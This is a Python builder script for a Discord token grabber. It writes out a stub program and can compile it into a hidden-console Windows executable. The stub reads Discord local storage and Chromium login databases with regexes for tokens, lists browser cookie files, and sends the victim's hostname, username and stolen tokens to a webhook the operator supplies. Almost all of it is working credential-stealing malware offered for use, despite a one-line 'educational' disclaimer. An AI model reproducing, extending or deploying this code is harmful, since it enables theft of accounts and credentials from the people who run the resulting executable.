"""Token Grabber Builder — Build Discord token grabber .exe with webhook exfil."""

import os
import sys
import time
import subprocess

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

TOKEN_STUB = r'''
import os, sys, json, re, base64, urllib.request, sqlite3, shutil, subprocess, platform, time
from datetime import datetime

WEBHOOK = "{webhook}"
DEBUG = {debug}
STEALTH = {stealth}

def dprint(msg):
    if DEBUG:
        try:
            p = os.path.join(os.getenv("APPDATA", "."), "grab_debug.txt")
            with open(p, "a") as f:
                f.write(f"[{{datetime.now().strftime('%H:%M:%S')}}] {{msg}}\n")
        except: pass

def send(text):
    try:
        data = json.dumps({{"content": text}}).encode()
        req = urllib.request.Request(WEBHOOK, data=data, headers={{"Content-Type": "application/json"}})
        urllib.request.urlopen(req, timeout=10)
        dprint(f"Sent: {{len(text)}} chars")
    except Exception as e:
        dprint(f"Send error: {{e}}")

def send_file(name, content):
    try:
        boundary = "----Boundary"
        body = f"--{{boundary}}\r\nContent-Disposition: form-data; name=\\"file\\"; filename=\\"{{name}}\\"\\r\\nContent-Type: text/plain\\r\\n\\r\\n{{content}}\\r\\n--{{boundary}}--\\r\\n".encode()
        req = urllib.request.Request(WEBHOOK, data=body, headers={{"Content-Type": f"multipart/form-data; boundary={{boundary}}"}})
        urllib.request.urlopen(req, timeout=10)
    except: pass

def grab_tokens_chromium(path):
    tokens = []
    try:
        local = os.path.join(os.getenv("LOCALAPPDATA", ""), path, "User Data", "Local State")
        if not os.path.isfile(local): return tokens
        with open(local, "r") as f:
            key = json.loads(f.read())["os_crypt"]["encrypted_key"]
        key = base64.b64decode(key)[5:]
        db_path = os.path.join(os.getenv("LOCALAPPDATA", ""), path, "User Data", "Default", "Login Data")
        if not os.path.isfile(db_path):
            db_path = os.path.join(os.getenv("LOCALAPPDATA", ""), path, "User Data", "Profile 1", "Login Data")
        if not os.path.isfile(db_path): return tokens
        tmp = os.path.join(os.getenv("TEMP", "."), "tmp_login.db")
        shutil.copy2(db_path, tmp)
        conn = sqlite3.connect(tmp)
        for row in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
            url, user, pwd = row
            if "discord" in url.lower():
                tokens.append(f"URL: {{url}} | User: {{user}}")
        conn.close()
        os.remove(tmp)
    except Exception as e:
        dprint(f"Chromium grab error: {{e}}")
    return tokens

def grab_discord_tokens():
    tokens = []
    paths = [
        "Discord", "Discord Canary", "Discord PTB", "Discord Development",
        "Google\\Chrome\\User Data", "BraveSoftware\\Brave-Browser\\User Data",
        "Opera Software\\Opera Stable", "Opera Software\\Opera GX Stable",
        "Microsoft\\Edge\\User Data", "Vivaldi\\User Data",
    ]
    for p in paths:
        found = grab_tokens_chromium(p)
        tokens.extend(found)
    try:
        roaming = os.getenv("APPDATA", "")
        for app in ["Discord", "Discord Canary", "Discord PTB"]:
            path = os.path.join(roaming, app, "Local Storage", "leveldb")
            if os.path.isdir(path):
                for f in os.listdir(path):
                    if f.endswith((".log", ".ldb")):
                        with open(os.path.join(path, f), "r", errors="ignore") as fh:
                            content = fh.read()
                            for match in re.findall(r"[MN][A-Za-z0-9]{{23,}}\\.[a-zA-Z0-9_-]{{6}}\\.[a-zA-Z0-9_-]{{27,}}", content):
                                tokens.append(match)
    except Exception as e:
        dprint(f"Discord path error: {{e}}")
    return list(set(tokens))

def grab_browser_data():
    data = []
    browsers = {{
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"),
    }}
    for name, path in browsers.items():
        cookies = os.path.join(path, "Default", "Cookies")
        if os.path.isfile(cookies):
            data.append(f"{{name}}: Cookies found ({{os.path.getsize(cookies)}} bytes)")
    return data

def main():
    dprint("=== TOKEN GRABBER STARTED ===")
    info = platform.node() + " | " + os.getenv("USERNAME", "?")
    send(f"[TOKEN GRAB] {{info}} | {{platform.platform()}}")
    tokens = grab_discord_tokens()
    if tokens:
        for t in tokens:
            send(f"Token: ||`{{t}}`||")
        send(f"Found {{len(tokens)}} token(s)")
    else:
        send("[TOKEN GRAB] No tokens found")
    browser = grab_browser_data()
    if browser:
        send("\\n".join(browser))
    dprint(f"Done: {{len(tokens)}} tokens, {{len(browser)}} browser entries")

if __name__ == "__main__":
    try:
        main()
    except: pass
'''

def _dbg(title, msg):
    cprint(f"  \033[90m[DBG] {title}: {msg}\033[0m")

def run(kevbin=None):
    debug_mode = False
    while True:
        clear()
        dbg = " \033[91m[DEBUG]\033[0m" if debug_mode else ""
        cprint("  \033[93m\u2554" + "\u2550"*50 + "\u2557")
        cprint(f"  \033[93m\u2551       TOKEN GRABBER BUILDER{dbg}" + " "*(26-len(dbg)) + "\u2551")
        cprint("  \033[93m\u255a" + "\u2550"*50 + "\u255d")
        cprint("  \033[91m[!] Educational/research only\033[0m")
        print()
        cprint("  \033[97m[1]  Build Grabber (.py)\033[0m")
        cprint("  \033[97m[2]  Build Grabber (.exe)\033[0m")
        cprint("  \033[97m[3]  View Stub Source\033[0m")
        cprint("  \033[97m[4]  Toggle Debug Mode\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0': return
        elif choice == '4':
            debug_mode = not debug_mode
            cprint(f"  Debug: {'ON' if debug_mode else 'OFF'}")
            time.sleep(0.5); continue
        elif choice in ('1', '2'):
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  TOKEN GRABBER CONFIG\033[0m")
            cprint("  \033[93m\u2550"*54)
            webhook = prompt("  \033[96mWebhook URL: \033[0m").strip()
            if not webhook or 'discord' not in webhook:
                cprint("  \033[91m[X] Need valid webhook\033[0m"); pause(); continue
            stealth = prompt("  \033[96mStealth mode? (y/n, default y): \033[0m").strip().lower() != 'n'
            if debug_mode:
                _dbg("CONFIG", f"Webhook={webhook[:30]}... Stealth={stealth}")
            stub = TOKEN_STUB.format(webhook=webhook, debug=str(debug_mode), stealth=str(stealth))
            out = prompt("  \033[96mOutput filename (default: grabber.py): \033[0m").strip() or "grabber.py"
            if not out.endswith('.py'): out += '.py'
            with open(out, 'w', encoding='utf-8') as f: f.write(stub)
            cprint(f"  \033[92m[X] Saved: {out} ({os.path.getsize(out)} bytes)\033[0m")
            if choice == '2':
                exe_name = os.path.splitext(out)[0] + ".exe"
                cprint("  \033[36m[*] Compiling...\033[0m")
                try:
                    cmd = [sys.executable, '-m', 'PyInstaller', '--onefile', '--noconsole', '--clean',
                           '--name', os.path.splitext(exe_name)[0], out]
                    if debug_mode: _dbg("CMD", " ".join(cmd))
                    subprocess.run(cmd, check=True, timeout=180, capture_output=debug_mode, text=debug_mode)
                    dp = os.path.join("dist", exe_name)
                    if os.path.isfile(dp):
                        cprint(f"  \033[92m[X] Built: {dp} ({os.path.getsize(dp):,} bytes)\033[0m")
                except FileNotFoundError:
                    cprint("  \033[91m[X] pip install pyinstaller\033[0m")
                except Exception as e:
                    cprint(f"  \033[91m[X] Error: {e}\033[0m")
                    if debug_mode: _dbg("ERR", str(e))
        elif choice == '3':
            clear()
            stub = TOKEN_STUB.format(webhook="WEBHOOK_URL", debug="False", stealth="True")
            print(stub)
        else:
            cprint("  \033[91mInvalid choice\033[0m"); time.sleep(0.5)
        pause()
